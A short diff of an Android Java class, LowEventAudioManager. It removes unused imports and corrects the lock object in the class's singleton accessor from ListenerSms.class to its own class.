@@ -1,21 +1,16 @@
 package com.android.dvci.listener;
 
-import android.content.Context;
-import android.media.AudioManager;
-
 import com.android.dvci.ProcessInfo;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
-import com.android.dvci.interfaces.IProcessObserver;
 import com.android.dvci.interfaces.Observer;
-import com.android.dvci.module.ProcessObserver;
 import com.android.dvci.module.message.LowEventAudio;
-import com.android.dvci.module.message.LowEventSms;
+
 import com.android.dvci.util.Check;
 import com.android.dvci.util.Execute;
 import com.android.dvci.util.Instrument;
 import com.android.dvci.util.LowEventMsg;
-import com.android.dvci.util.Utils;
+
 import com.android.mm.M;
 
 import java.util.HashMap;
@@ -44,7 +39,7 @@ public class LowEventAudioManager extends Listener<LowEventAudio> implements Obs
 	 */
 	public static LowEventAudioManager self() {
 		if (singleton == null) {
-			synchronized (ListenerSms.class) {
+			synchronized (LowEventAudioManager.class) {
 				if (singleton == null) {
 					singleton = new LowEventAudioManager();
 				}
